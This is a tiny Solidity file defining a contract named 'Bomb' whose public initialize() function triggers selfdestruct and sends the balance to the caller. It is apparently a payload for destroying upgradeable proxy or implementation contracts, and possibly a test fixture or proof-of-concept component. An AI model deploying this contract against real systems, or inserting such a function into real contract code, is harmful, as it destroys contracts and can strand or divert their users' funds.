// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bomb {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}